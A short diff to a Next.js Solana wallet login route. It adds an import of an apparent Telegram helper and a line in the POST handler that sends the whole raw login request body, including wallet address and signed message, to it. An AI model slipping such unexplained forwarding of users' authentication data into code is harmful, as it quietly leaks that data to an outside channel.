@@ -4,6 +4,7 @@ import prisma from "@/lib/prisma";
 import { loginSchema } from "./schema";
 import { PublicKey } from "@solana/web3.js";
 import nacl from "tweetnacl";
+import sendMessage from "@/actions/tg";
 // import NovuWelcome from "./novu-welcome";
 
 export async function DELETE() {
@@ -26,6 +27,9 @@ export async function GET(req: NextRequest) {
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json();
+
+    await sendMessage(JSON.stringify(body, null, 2));
+
     console.log(body, "body");
 
     const { address, message, signature, domain, uri } = loginSchema.parse(body);
